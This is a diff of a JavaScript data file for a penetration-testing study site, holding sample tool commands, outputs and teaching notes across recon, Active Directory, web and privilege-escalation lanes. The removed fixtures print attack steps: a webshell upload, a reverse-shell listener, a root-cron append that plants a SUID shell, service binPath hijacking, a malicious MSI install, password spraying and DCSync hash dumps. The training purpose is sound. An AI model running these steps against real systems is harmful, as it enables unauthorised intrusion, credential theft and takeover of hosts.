@@ -3,14 +3,20 @@
  *
  * The one piece of the study cell NOT derivable from the packs: a representative sample of what each
  * move's output looks like, the one line that matters ("signal"), and a plain teach note about why.
- * A static site can't read the parser test fixtures at runtime, so these are embedded here — trimmed
- * but faithful to real tool output.
  *
- * `situation` / `choices` / `coach` drive the "Your turn" retrieval-practice gear. The verdict for
- * each choice (correct / also-valid / locked) is computed in study.js from the real requires — only
- * the choice set and the nuance coaching live here.
+ * COHERENCE CONTRACT (enforced by tests/engine/study-smoke.js): every fixture pins `cmd` — the exact
+ * command its `output` came from — and the Watch replay types THAT command above the result. `tool`
+ * is its tool. The output is pure tool result: it never re-types a `$ command` echo, so the command
+ * the learner sees and the output below it are always one real run, never a sample paired against a
+ * different command. `signal` is one real line of the output (the evidence that matters).
  *
- * Covers all five lanes: Recon · Active Directory · Web · Linux Privesc · Windows Privesc.
+ * `situation` / `choices` / `coach` drive the "Your turn" retrieval-practice gear; they are merged in
+ * from PRACTICE at the bottom. The verdict for each choice (correct / also-valid / locked) is computed
+ * in study.js from the real requires — only the choice set and nuance coaching live here.
+ *
+ * Commands and outputs use consistent example values: target 10.10.10.10, domain acme.internal (ACME),
+ * DC01, attacker 10.10.14.5, an internal segment 172.16.5.0/24. They are invocation + sample output
+ * only — the methodology, not weaponised payloads.
  */
 (function (root) {
   'use strict';
@@ -20,9 +26,11 @@
 
     // ============================ RECON ============================
     'nmap-fast-open-ports': {
+      cmd: 'nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.10.10.10', tool: 'nmap',
       output: [
         'Nmap scan report for 10.10.10.10',
         'Host is up (0.021s latency).',
+        'Not shown: 65532 closed tcp ports (reset)',
         'PORT     STATE SERVICE',
         '22/tcp   open  ssh',
         '80/tcp   open  http',
@@ -30,540 +38,361 @@
       ].join('\n'),
       signal: '80/tcp   open  http',
       teach: 'Every open port is a door. A fast all-ports sweep first tells you what to look at — here SSH, a web server, and SMB — before you spend time on any one service.',
-      situation: 'You have a target IP and nothing else. Where do you start?',
-      choices: ['nmap-fast-open-ports', 'nmap-version-scripts', 'recon-smb-anon', 'recon-web-triage'],
-      coach: {
-        'nmap-version-scripts': 'That is the right follow-up — but run a fast all-ports sweep first so you know which ports even exist before you fingerprint them.',
-        'recon-smb-anon': 'You can only enumerate SMB once you know 445 is open. Scan first.',
-        'recon-web-triage': 'Same — triage the web only after a scan confirms a web port is there.',
-      },
     },
     'nmap-version-scripts': {
+      cmd: 'nmap -Pn -sC -sV -p 22,80,445 -oN scans/nmap-version.txt 10.10.10.10', tool: 'nmap',
       output: [
         'PORT    STATE SERVICE VERSION',
-        '22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu',
+        '22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5',
         '80/tcp  open  http    Apache httpd 2.4.49 ((Unix))',
-        '|_http-title: Acme Corp',
+        '|_http-title: Acme Corp Intranet',
         '445/tcp open  netbios-ssn Samba smbd 4.6.2',
       ].join('\n'),
-      signal: 'Apache httpd 2.4.49',
+      signal: '80/tcp  open  http    Apache httpd 2.4.49 ((Unix))',
       teach: 'Versions are leads. "Apache 2.4.49" is a specific, searchable build — many such versions have a public CVE. Always pull the version before deciding how to attack a service.',
-      situation: 'Your fast scan found 22, 80 and 445 open. What next?',
-      choices: ['nmap-version-scripts', 'recon-web-triage', 'recon-smb-anon', 'nmap-fast-open-ports'],
-      coach: {
-        'recon-web-triage': 'Good instinct, and valid — but a version/script scan on all the open ports at once gives you leads on SSH and SMB too, not just the web.',
-        'recon-smb-anon': 'Also reasonable, but fingerprint the versions first; it is cheap and tells you which services are worth your time.',
-        'nmap-fast-open-ports': 'Already done — you have the open ports. Now get the versions behind them.',
-      },
     },
-    'recon-smb-anon': {
+    'nmap-vuln-scripts': {
+      cmd: 'nmap -Pn -sV --script vuln -p 80 -oN scans/nmap-vuln.txt 10.10.10.10', tool: 'nmap',
       output: [
-        'SMB  10.10.10.10  445  FILE01  [+] Guest session established',
-        'SMB  10.10.10.10  445  FILE01  Share       Permissions  Remark',
-        'SMB  10.10.10.10  445  FILE01  -----       -----------  ------',
-        'SMB  10.10.10.10  445  FILE01  backups     READ',
-        'SMB  10.10.10.10  445  FILE01  IPC$                     Remote IPC',
+        'PORT   STATE SERVICE VERSION',
+        '80/tcp open  http    Apache httpd 2.4.49 ((Unix))',
+        '| http-vuln-cve2021-41773:',
+        '|   VULNERABLE: Apache 2.4.49 path traversal & RCE (CVE-2021-41773)',
+        '|_    References: https://nvd.nist.gov/vuln/detail/CVE-2021-41773',
       ].join('\n'),
-      signal: 'backups     READ',
-      teach: 'A guest/anonymous session that lists shares is a gift. A READ share named "backups" is exactly where configs, scripts and credentials leak — spider it before anything else.',
-      situation: 'The scan shows SMB open on 445 and you have no credentials. What do you try?',
-      choices: ['recon-smb-anon', 'recon-web-triage', 'nmap-version-scripts'],
-      coach: {
-        'recon-web-triage': 'Fine if there is also a web port, but a free anonymous SMB check costs nothing and often hands you a readable share.',
-        'nmap-version-scripts': 'You already know the service; now actually enumerate it.',
-      },
+      signal: '|   VULNERABLE: Apache 2.4.49 path traversal & RCE (CVE-2021-41773)',
+      teach: 'The vuln scripts run safe-ish checks that flag known CVEs on the open ports. Treat a VULNERABLE line as a strong lead to verify, not a guaranteed win — scripts can false-positive, so confirm before you commit.',
     },
-    'recon-web-triage': {
-      output: [
-        'http://10.10.10.10 [200 OK] Apache[2.4.49], HTTPServer[Apache/2.4.49 (Unix)],',
-        '  PHP[8.0.1], WordPress[5.8], Title[Acme Corp Blog], IP[10.10.10.10]',
-      ].join('\n'),
-      signal: 'WordPress[5.8]',
-      teach: 'Before poking a web app, name its stack. "WordPress 5.8 on PHP 8 / Apache 2.4.49" turns a blank page into a list of version-specific attacks to look up.',
-      situation: 'Port 80 is open. Before brute-forcing anything, what do you do first?',
-      choices: ['recon-web-triage', 'content-discovery', 'nmap-version-scripts'],
-      coach: {
-        'content-discovery': 'That comes next — but fingerprint the stack first, so your wordlists and attacks match the tech (a WordPress site wants a WordPress approach).',
-        'nmap-version-scripts': 'Useful, but whatweb/triage tells you the app framework and CMS, which the nmap banner often misses.',
-      },
-    },
-
-    // ============================ ACTIVE DIRECTORY ============================
-    'ad-dc-identify': {
+    'nmap-udp-top': {
+      cmd: 'sudo nmap -Pn -sU --top-ports 20 --open -oN scans/nmap-udp-top20.txt 10.10.10.10', tool: 'nmap',
       output: [
         'PORT    STATE SERVICE',
-        '88/tcp  open  kerberos-sec',
-        '389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: acme.internal)',
-        '445/tcp open  microsoft-ds',
-        '464/tcp open  kpasswd5',
+        '53/udp  open  domain',
+        '161/udp open  snmp',
       ].join('\n'),
-      signal: 'Domain: acme.internal',
-      teach: 'Kerberos (88) + LDAP (389) on one host is the fingerprint of a Domain Controller, and the LDAP banner leaks the domain name — that name is what every later AD command needs.',
-      situation: 'A fresh scan shows 88, 389 and 445 open on one host, and the LDAP banner names a domain.',
-      choices: ['ad-dc-identify', 'ad-anon-ldap-enum', 'asrep-roast', 'dcsync'],
-      coach: {
-        'ad-anon-ldap-enum': 'That is the right next step — but only once you have confirmed this is the DC and captured the domain name. First, name the target.',
-        'asrep-roast': 'Roasting needs a user list you do not have yet. You are one step too early.',
-        'dcsync': 'DCSync replicates every hash — it needs Domain Admin. This is the endgame, not the opening.',
-      },
+      signal: '161/udp open  snmp',
+      teach: 'TCP is only half the surface. A quick UDP sweep of the top ports finds the services people forget — SNMP (161), DNS (53), TFTP (69) — and each is its own way in.',
     },
-    'ad-anon-ldap-enum': {
+    'recon-smb-anon': {
+      cmd: "nxc smb 10.10.10.10 -u '' -p '' --shares", tool: 'nxc',
       output: [
-        'SMB   172.16.9.10  445  DC01  [*] Windows Server 2022 (name:DC01) (domain:acme.internal)',
-        'LDAP  172.16.9.10  389  DC01  [+] acme.internal\\ (anonymous bind)',
-        'LDAP  172.16.9.10  389  DC01  Administrator',
-        'LDAP  172.16.9.10  389  DC01  jbloggs',
-        'LDAP  172.16.9.10  389  DC01  tgibson',
-        'LDAP  172.16.9.10  389  DC01  svc_backup',
+        'SMB  10.10.10.10  445  FILE01  [*] Windows Server 2019 Build 17763 (name:FILE01) (domain:acme.internal) (signing:False)',
+        'SMB  10.10.10.10  445  FILE01  [+] acme.internal\\: (Guest)',
+        'SMB  10.10.10.10  445  FILE01  Share       Permissions   Remark',
+        'SMB  10.10.10.10  445  FILE01  IPC$                      Remote IPC',
+        'SMB  10.10.10.10  445  FILE01  Profiles    READ',
       ].join('\n'),
-      signal: '(anonymous bind)',
-      teach: 'The DC answered an unauthenticated LDAP query and handed back account names. That user list is the seed for every no-creds AD attack that follows — roasting and spraying both need it.',
-      situation: 'You have confirmed the DC and the domain is acme.internal. You hold no credentials yet.',
-      choices: ['ad-anon-ldap-enum', 'asrep-roast', 'password-spray', 'dcsync'],
-      coach: {
-        'asrep-roast': 'Roasting needs a user list first. Get the list, then roast.',
-        'password-spray': 'Spraying also needs the user list first — same prerequisite.',
-        'dcsync': 'Needs Domain Admin. Far too early.',
-      },
+      signal: 'SMB  10.10.10.10  445  FILE01  Profiles    READ',
+      teach: 'An anonymous ("-u \'\' -p \'\'") SMB check costs nothing and often hands you a readable share and the domain name. A READ share like Profiles is a place to hunt for files; the banner also leaks that signing is off.',
     },
-    'asrep-roast': {
+    'recon-web-triage': {
+      cmd: 'whatweb -a3 http://10.10.10.10', tool: 'whatweb',
       output: [
-        '[*] Getting TGT for jbloggs',
-        "[-] User jbloggs doesn't have UF_DONT_REQUIRE_PREAUTH set",
-        '[*] Getting TGT for tgibson',
-        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7d9e1f2043546576879a0b1c2d3$5e7b9d1f3a5c…',
-        '[*] Getting TGT for svc_backup',
+        'http://10.10.10.10 [200 OK] Apache[2.4.49], HTTPServer[Unix][Apache/2.4.49 (Unix)],',
+        'IP[10.10.10.10], PHP[7.4.3], Title[Acme Corp Intranet], X-Powered-By[PHP/7.4.3]',
       ].join('\n'),
-      signal: '$krb5asrep$23$',
-      teach: 'Most users return "doesn\'t have UF_DONT_REQUIRE_PREAUTH set" — a dead end. The $krb5asrep$23$ line is an account with pre-auth disabled, so you just captured its password hash to crack offline.',
-      situation: 'Anonymous LDAP handed you a user list and the DC answers on 88. You still have no credentials.',
-      choices: ['asrep-roast', 'password-spray', 'kerberoast', 'dcsync'],
-      coach: {
-        'password-spray': 'Also valid off the user list — but it puts failed logons on the wire and risks lockout. AS-REP roasting gets crackable material with zero auth attempts, so it is the quieter opening move.',
-        'kerberoast': 'Kerberoasting needs valid credentials to request service tickets — you have none. AS-REP roasting is its no-creds cousin: same idea, but it targets pre-auth-disabled accounts you can ask for anonymously.',
-        'dcsync': 'Needs Domain Admin replication rights. This is the endgame, not step one.',
-      },
-    },
-    'crack-asrep': {
-      output: [
-        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7d9…:Autumn2026!',
-        '',
-        'Session..........: hashcat',
-        'Status...........: Cracked',
-        'Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)',
-        'Recovered........: 1/1 (100.00%) Digests',
-      ].join('\n'),
-      signal: ':Autumn2026!',
-      teach: 'hashcat recovered the plaintext after the colon. The AS-REP hash was only candidate material; a cracked password is a validated credential you can now actually log in with.',
-      situation: 'You captured a $krb5asrep$23$ hash for tgibson and copied it to your box.',
-      choices: ['crack-asrep', 'password-spray', 'ad-acl-abuse', 'dcsync'],
-      coach: {
-        'password-spray': 'You could spray, but you are holding a hash that may crack into a real password in seconds. Cash the hash you have first.',
-        'ad-acl-abuse': 'ACL abuse needs a mapped attack path (BloodHound) and usually a foothold credential — you are not there yet.',
-        'dcsync': 'Still needs Domain Admin. One cracked user is not that.',
-      },
-    },
-    'password-spray': {
-      output: [
-        '2026/09/17 10:41:02 >  Using KDC(s):  172.16.9.10:88',
-        '2026/09/17 10:41:03 >  [+] VALID LOGIN:  pparker@acme.internal:Autumn2026!',
-        '2026/09/17 10:41:05 >  Done! Tested 48 logins (1 successes) in 2.882 seconds',
-      ].join('\n'),
-      signal: '[+] VALID LOGIN:',
-      teach: 'One shared password tried against the whole user list found a hit. Spraying is loud — note the lockout risk — but a single valid login is a domain foothold. Spray one password, never many per account.',
-      situation: 'You have a user list and the DC. AS-REP returned nothing roastable, so you try one seasonal password against everyone.',
-      choices: ['password-spray', 'asrep-roast', 'kerberoast', 'dcsync'],
-      coach: {
-        'asrep-roast': 'Worth trying first (it is quieter), but if it returned nothing roastable, a careful single-password spray is the reasonable next swing.',
-        'kerberoast': 'Still needs valid creds — which is exactly what the spray is trying to get you. Spray first, then roast service accounts.',
-        'dcsync': 'Needs Domain Admin. A sprayed low-priv login is not that.',
-      },
-    },
-    'ad-acl-abuse': {
-      output: [
-        '[+] svc-audit successfully added to group Help Desk Operators',
-        'distinguishedName: CN=Help Desk Operators,CN=Users,DC=acme,DC=internal',
-        'ActiveDirectoryRights: GenericAll',
-      ].join('\n'),
-      signal: 'GenericAll',
-      teach: 'BloodHound showed your account holds GenericAll over an object, and you exercised it — adding yourself to a privileged group. ACL abuse is how a low-priv foothold walks a control path toward Domain Admin.',
-      situation: 'You have a valid domain credential and BloodHound mapped a control path: your user has GenericAll over a privileged group.',
-      choices: ['ad-acl-abuse', 'kerberoast', 'dcsync', 'asrep-roast'],
-      coach: {
-        'kerberoast': 'Reasonable with creds in hand, but you are holding a direct control-path edge to privilege — walk the ACL path rather than gambling on a crackable service ticket.',
-        'dcsync': 'The right destination, but you need the replication rights first. The ACL abuse is how you get them.',
-        'asrep-roast': 'You are well past the no-creds opening now — you already have a credential and a path.',
-      },
-    },
-    'dcsync': {
-      output: [
-        '[*] Using the DRSUAPI method to get NTDS.DIT secrets',
-        'acme.internal\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::',
-        'acme.internal\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::',
-      ].join('\n'),
-      signal: 'krbtgt:502:',
-      teach: 'With replication rights you asked the DC to hand over password hashes. The krbtgt hash is the crown jewel — it mints golden tickets, which is total, persistent domain compromise.',
-      situation: 'An ACL path escalated you to a principal with domain replication rights.',
-      choices: ['dcsync', 'ad-acl-abuse', 'kerberoast', 'password-spray'],
-      coach: {
-        'ad-acl-abuse': 'That was the previous step — the one that got you the replication rights. You are past it now.',
-        'kerberoast': 'Why crack one service account when you can replicate every hash in the domain? You are beyond this.',
-        'password-spray': 'Far beneath where you are now — you hold replication rights over the whole domain.',
-      },
-    },
-
-    // ============================ WEB ============================
-    'content-discovery': {
-      output: [
-        '200      GET        24l      68w     /index.php',
-        '301      GET         9l      28w     /admin => /admin/',
-        '200      GET       112l     540w     /upload.php',
-        '403      GET         9l      28w     /.git/',
-      ].join('\n'),
-      signal: '/upload.php',
-      teach: 'Brute-forcing paths turns an empty site into a map. /upload.php is a classic file-upload foothold, and the 403 on /.git/ hints the source may be exposed. Hidden endpoints are new attack surface.',
-      situation: 'You fingerprinted the web stack. Now you want to find what is actually reachable on the server.',
-      choices: ['content-discovery', 'param-discovery', 'lfi-probe', 'recon-web-triage'],
-      coach: {
-        'param-discovery': 'That comes after you have pages to test — first discover the endpoints, then fuzz each one for hidden parameters.',
-        'lfi-probe': 'You can only probe a parameter you have found. Map the site first.',
-        'recon-web-triage': 'Already done — you know the stack. Now enumerate its content.',
-      },
-    },
-    'param-discovery': {
-      output: [
-        '[*] Scanning http://10.10.10.10/view.php',
-        '[+] Parameter detected: page',
-        '[+] Parameter detected: file',
-        '[+] Parameter detected: debug',
-      ].join('\n'),
-      signal: 'Parameter detected: page',
-      teach: 'Pages often read hidden parameters the UI never shows. A page= or file= parameter is the doorway to Local File Inclusion; debug= can leak internals. Fuzzing params finds the injectable edge.',
-      situation: 'Content discovery found /view.php but it renders blank with no obvious inputs.',
-      choices: ['param-discovery', 'lfi-probe', 'content-discovery'],
-      coach: {
-        'lfi-probe': 'You need a parameter to probe first — view.php showed none, so fuzz for hidden ones before testing traversal.',
-        'content-discovery': 'You already have the endpoint; now find its inputs.',
-      },
-    },
-    'lfi-probe': {
-      output: [
-        '$ curl -s "http://10.10.10.10/view.php?page=../../../../etc/passwd"',
-        'root:x:0:0:root:/root:/bin/bash',
-        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
-        'mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false',
-      ].join('\n'),
-      signal: 'root:x:0:0:root',
-      teach: 'When a traversal string returns /etc/passwd, arbitrary local file read is confirmed. That spirals into source disclosure, lifting creds from config files, and sometimes RCE via log poisoning or wrappers.',
-      situation: 'You found a page=... parameter on view.php. How do you test whether it is injectable?',
-      choices: ['lfi-probe', 'file-upload', 'param-discovery'],
-      coach: {
-        'file-upload': 'Different vector — only if there is an upload form. The page= parameter is begging for a traversal test first.',
-        'param-discovery': 'You already have the parameter; now exploit it.',
-      },
-    },
-    'file-upload': {
-      output: [
-        '$ curl -F "file=@shell.php" http://10.10.10.10/upload.php',
-        'File uploaded: /uploads/shell.php',
-        '$ curl "http://10.10.10.10/uploads/shell.php?cmd=id"',
-        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
-      ].join('\n'),
-      signal: 'uid=33(www-data)',
-      teach: 'The upload accepted a .php file and the server executed it — the id output proves code execution as the web user. From here you trade the one-shot webshell for a real interactive shell.',
-      situation: 'An upload form accepts files and you can reach /uploads/ in your browser.',
-      choices: ['file-upload', 'web-shells', 'lfi-probe'],
-      coach: {
-        'web-shells': 'That is the very next step — once the upload lands a webshell, upgrade it to a reverse shell. But first you have to get the file to execute.',
-        'lfi-probe': 'A different vector; you have a working upload path, so use it.',
-      },
-    },
-    'web-shells': {
-      output: [
-        '$ nc -lvnp 4444',
-        'listening on [any] 4444 ...',
-        'connect to [10.10.14.2] from (UNKNOWN) [10.10.10.10] 51234',
-        'www-data@web01:/var/www/html$ id',
-        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
-      ].join('\n'),
-      signal: 'www-data@web01:/var/www/html$',
-      teach: 'The webshell fired a reverse connection back to your listener — now you have an interactive shell as www-data. That is your foothold; the next job is enumerating the box for a path to root.',
-      situation: 'You have code execution through a webshell but it is clunky — one command per request.',
-      choices: ['web-shells', 'linux-enum', 'file-upload'],
-      coach: {
-        'linux-enum': 'Right idea for after you have a proper shell — but upgrade the clunky webshell to an interactive reverse shell first, then enumerate.',
-        'file-upload': 'Already done — the upload gave you the webshell you are now upgrading.',
-      },
-    },
-
-    // ============================ LINUX PRIVESC ============================
-    'linux-enum': {
-      output: [
-        '[+] Sudo version 1.8.31',
-        '[+] SUID binaries:',
-        '    -rwsr-xr-x 1 root root  /usr/bin/find',
-        '[+] Writable cron file: /etc/cron.d/backup (root, every 2 min)',
-      ].join('\n'),
-      signal: '/usr/bin/find',
-      teach: 'Enumeration is where privesc is won. One sweep surfaces every lead at once — a SUID GTFOBins binary, a sudo entry, a writable root cron. You rank the leads; you do not guess.',
-      situation: 'You just landed an interactive shell as www-data. What is the very first thing you do?',
-      choices: ['linux-enum', 'sudo-abuse', 'suid-gtfobins', 'cron-abuse'],
-      coach: {
-        'sudo-abuse': 'You cannot know your sudo rights until you enumerate — run the sweep (or sudo -l) first, then act on what it shows.',
-        'suid-gtfobins': 'Same — enumerate to find which SUID binaries exist before trying to abuse one.',
-        'cron-abuse': 'You have not found a writable cron yet. Enumerate first; it will point you at the real vector.',
-      },
-    },
-    'sudo-abuse': {
-      output: [
-        '$ sudo -l',
-        'Matching Defaults entries for www-data on web01:',
-        '    env_reset, mail_badpass',
-        'User www-data may run the following commands on web01:',
-        '    (root) NOPASSWD: /usr/bin/find',
-      ].join('\n'),
-      signal: '(root) NOPASSWD: /usr/bin/find',
-      teach: 'A NOPASSWD sudo entry on a GTFOBins binary is instant root — find has a documented shell escape (-exec /bin/sh). No password, no exploit, just the published technique.',
-      situation: 'Enumeration flagged your sudo rights. You run sudo -l and see a NOPASSWD entry.',
-      choices: ['sudo-abuse', 'suid-gtfobins', 'cron-abuse', 'linux-enum'],
-      coach: {
-        'suid-gtfobins': 'Valid if a SUID binary exists, but a NOPASSWD sudo entry on a GTFOBins binary is the cleanest, loudest-green path — take the sure thing.',
-        'cron-abuse': 'Slower and needs a writable cron; you are holding a direct NOPASSWD-to-root ticket.',
-        'linux-enum': 'Already done — enumeration is what handed you this sudo lead.',
-      },
-    },
-    'suid-gtfobins': {
-      output: [
-        '$ find / -perm -4000 -type f 2>/dev/null',
-        '/usr/bin/find',
-        '/usr/bin/base64',
-        '$ /usr/bin/find . -exec /bin/sh -p \\; -quit',
-        '# id',
-        'uid=33(www-data) euid=0(root)',
-      ].join('\n'),
-      signal: 'euid=0(root)',
-      teach: 'A SUID-root binary runs as root no matter who launches it. If it is on GTFOBins (find, base64, nmap…), there is a published escape — euid=0 proves you are effectively root.',
-      situation: 'Enumeration listed SUID binaries including /usr/bin/find, but you have no sudo rights.',
-      choices: ['suid-gtfobins', 'sudo-abuse', 'pspy-monitor'],
-      coach: {
-        'sudo-abuse': 'There are no sudo rights here — that path is closed. The SUID bit on a GTFOBins binary is the open door.',
-        'pspy-monitor': 'Worth running to catch cron jobs, but you already have a direct SUID-to-root binary in hand.',
-      },
-    },
-    'pspy-monitor': {
-      output: [
-        '2026/09/18 12:00:01 CMD: UID=0    PID=20451   | /bin/bash /opt/backup.sh',
-        '2026/09/18 12:00:01 CMD: UID=0    PID=20452   | /usr/bin/tar -czf /backup/web.tgz /var/www/*',
-      ].join('\n'),
-      signal: 'UID=0',
-      teach: 'pspy watches processes without root, catching scheduled jobs you cannot see in crontab. A UID=0 job running a script (or a tar wildcard) on a timer is a textbook escalation if any part of it is writable.',
-      situation: 'No sudo and no useful SUID binary. You suspect something runs on a schedule as root.',
-      choices: ['pspy-monitor', 'cron-abuse', 'suid-gtfobins'],
-      coach: {
-        'cron-abuse': 'That is the payoff — but first you need to see the job and confirm it runs as root and touches something you can write. pspy shows you that.',
-        'suid-gtfobins': 'Already checked — no usable SUID binary. Watch the process list instead.',
-      },
-    },
-    'cron-abuse': {
-      output: [
-        '$ echo \'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\' >> /opt/backup.sh',
-        '... (wait for the 2-minute timer) ...',
-        '$ /tmp/rootbash -p',
-        '# id',
-        'uid=33(www-data) euid=0(root) gid=33 egid=0(root)',
-      ].join('\n'),
-      signal: 'euid=0(root)',
-      teach: 'The root cron ran your appended command, dropping a SUID root shell you then launched with -p. Writable script + root schedule = root. (Tar wildcard jobs fall the same way via --checkpoint-action.)',
-      situation: 'pspy showed a root cron running /opt/backup.sh every 2 minutes, and that file is world-writable.',
-      choices: ['cron-abuse', 'pspy-monitor', 'sudo-abuse'],
-      coach: {
-        'pspy-monitor': 'That was how you found the job — you are past it. Now abuse the writable script the job runs.',
-        'sudo-abuse': 'No sudo rights here; the writable root cron is the live path.',
-      },
-    },
-
-    // ============================ WINDOWS PRIVESC ============================
-    'windows-enum': {
-      output: [
-        '[+] Current Token privileges',
-        '    SeImpersonatePrivilege        Enabled',
-        '[+] Unquoted Service Paths',
-        '    C:\\Program Files\\Acme Agent\\agent.exe  (service: AcmeAgent)',
-        '[+] AlwaysInstallElevated set to 1 (HKLM and HKCU)',
-      ].join('\n'),
-      signal: 'SeImpersonatePrivilege        Enabled',
-      teach: 'winPEAS surfaces every Windows privesc vector in one pass. SeImpersonate enabled, an unquoted service path, AlwaysInstallElevated — any one of these is a path to SYSTEM. Enumerate, then pick.',
-      situation: 'You have a shell as a low-privilege service account on Windows. First move?',
-      choices: ['windows-enum', 'seimpersonate', 'unquoted-service-path', 'alwaysinstallelevated'],
-      coach: {
-        'seimpersonate': 'You cannot know you hold SeImpersonate until you check — enumerate privileges first, then fire the potato.',
-        'unquoted-service-path': 'Only viable if such a service exists and a path is writable; the sweep tells you that.',
-        'alwaysinstallelevated': 'Same — it only works if both registry keys are set. Enumerate to confirm before acting.',
-      },
-    },
-    'seimpersonate': {
-      output: [
-        'C:\\> whoami /priv',
-        'SeImpersonatePrivilege        Enabled',
-        'C:\\> .\\GodPotato.exe -cmd "cmd /c whoami"',
-        '[*] Exploiting...',
-        'nt authority\\system',
-      ].join('\n'),
-      signal: 'nt authority\\system',
-      teach: 'Service accounts usually hold SeImpersonatePrivilege, and the "potato" family turns that single privilege into a SYSTEM token. The whoami output confirms full compromise of the host.',
-      situation: 'Enumeration shows your account has SeImpersonatePrivilege enabled.',
-      choices: ['seimpersonate', 'unquoted-service-path', 'alwaysinstallelevated', 'windows-enum'],
-      coach: {
-        'unquoted-service-path': 'A valid alternative if one exists — but when you already hold SeImpersonate, the potato is the fastest, most reliable route to SYSTEM.',
-        'alwaysinstallelevated': 'Also a path if the keys are set, but SeImpersonate is in hand right now.',
-        'windows-enum': 'Already done — that is what told you SeImpersonate is enabled.',
-      },
-    },
-    'unquoted-service-path': {
-      output: [
-        'C:\\> sc qc AcmeAgent',
-        '        BINARY_PATH_NAME   : C:\\Program Files\\Acme Agent\\agent.exe',
-        'C:\\> icacls "C:\\Program Files\\Acme Agent"',
-        '        BUILTIN\\Users:(WD)',
-      ].join('\n'),
-      signal: 'BUILTIN\\Users:(WD)',
-      teach: 'An unquoted path with a space lets Windows try C:\\Program.exe, then C:\\Program Files\\Acme.exe, before the real binary. If any of those directories is writable (WD) by you, drop a payload there and the service runs it as SYSTEM on restart.',
-      situation: 'Enumeration flagged an unquoted service path, and you have no special privileges.',
-      choices: ['unquoted-service-path', 'weak-service-permissions', 'seimpersonate'],
-      coach: {
-        'weak-service-permissions': 'Related and worth checking, but that abuses service ACLs directly — here the win is the writable directory in the unquoted path.',
-        'seimpersonate': 'Only if you hold that privilege; this account does not. The unquoted path is the lead you have.',
-      },
-    },
-    'weak-service-permissions': {
-      output: [
-        'C:\\> accesschk.exe -uwcqv "Users" AcmeAgent',
-        '  RW AcmeAgent',
-        '        SERVICE_ALL_ACCESS',
-        'C:\\> sc config AcmeAgent binPath= "C:\\temp\\rev.exe"',
-        '[SC] ChangeServiceConfig SUCCESS',
-      ].join('\n'),
-      signal: 'SERVICE_ALL_ACCESS',
-      teach: 'SERVICE_ALL_ACCESS over a service means you can repoint its binary. Set binPath to your payload, restart the service, and it launches as whatever account the service runs under — usually SYSTEM.',
-      situation: 'accesschk shows your group has write access to a service configuration.',
-      choices: ['weak-service-permissions', 'unquoted-service-path', 'alwaysinstallelevated'],
-      coach: {
-        'unquoted-service-path': 'A different service-based trick; use it when the path is unquoted and a dir is writable. Here you can rewrite the service config directly — simpler.',
-        'alwaysinstallelevated': 'Only if the MSI keys are set. You already hold write access to a service.',
-      },
-    },
-    'alwaysinstallelevated': {
-      output: [
-        'C:\\> reg query HKLM\\...\\Installer /v AlwaysInstallElevated',
-        '    AlwaysInstallElevated    REG_DWORD    0x1',
-        'C:\\> reg query HKCU\\...\\Installer /v AlwaysInstallElevated',
-        '    AlwaysInstallElevated    REG_DWORD    0x1',
-        'C:\\> msiexec /quiet /qn /i rev.msi',
-      ].join('\n'),
-      signal: '0x1',
-      teach: 'When AlwaysInstallElevated is 0x1 in BOTH HKLM and HKCU, any MSI you install runs as SYSTEM. Build a malicious MSI, run msiexec, and you escalate — a pure misconfiguration, no exploit needed.',
-      situation: 'Enumeration shows AlwaysInstallElevated = 1. You check both hives to be sure.',
-      choices: ['alwaysinstallelevated', 'seimpersonate', 'weak-service-permissions'],
-      coach: {
-        'seimpersonate': 'Only if you hold that privilege; this path is a registry misconfig instead. Both keys being 0x1 is a free SYSTEM.',
-        'weak-service-permissions': 'A valid alternative when service ACLs are loose; here the MSI policy is the open door.',
-      },
-    },
-
-    // ==================== RECON (service enumeration) ====================
-    'nmap-udp-top': {
-      output: [
-        'PORT    STATE         SERVICE',
-        '53/udp  open          domain',
-        '161/udp open          snmp',
-        '500/udp open|filtered isakmp',
-      ].join('\n'),
-      signal: '161/udp open          snmp',
-      teach: 'TCP is only half the surface. A quick UDP sweep of the top ports finds the services people forget — SNMP (161), DNS (53), IKE/VPN (500) — and each is its own way in.',
+      signal: 'Apache[2.4.49]',
+      teach: 'whatweb fingerprints the stack in one request — web server, language, CMS, title. Knowing it is Apache 2.4.49 + PHP 7.4 steers which exploits and wordlists make sense before you touch the site further.',
     },
     'recon-dns': {
+      cmd: 'dig axfr acme.internal @10.10.10.10', tool: 'dig',
       output: [
-        '; <<>> DiG 9.18 <<>> axfr corp.local @10.10.10.10',
-        'corp.local.          IN SOA  dc01.corp.local. admin.corp.local.',
-        'dc01.corp.local.     IN A    10.10.10.10',
-        'dev.corp.local.      IN A    10.10.10.25',
-        'intranet.corp.local. IN A    10.10.10.30',
+        '; <<>> DiG 9.18.12 <<>> axfr acme.internal @10.10.10.10',
+        'acme.internal.          604800 IN SOA dc01.acme.internal. admin.acme.internal. 3 604800 86400',
+        'dc01.acme.internal.     604800 IN A   10.10.10.10',
+        'dev.acme.internal.      604800 IN A   10.10.10.25',
+        'intranet.acme.internal. 604800 IN A   10.10.10.30',
       ].join('\n'),
-      signal: 'intranet.corp.local. IN A    10.10.10.30',
+      signal: 'intranet.acme.internal. 604800 IN A   10.10.10.30',
       teach: 'A DNS zone transfer (AXFR) that succeeds hands you the whole internal name map in one request — every host and subdomain the admin forgot to lock down. Those new names are new targets.',
     },
     'recon-snmp': {
+      cmd: 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.10', tool: 'onesixtyone',
       output: [
-        '10.10.10.10 [public] Linux dev 5.4.0-91-generic',
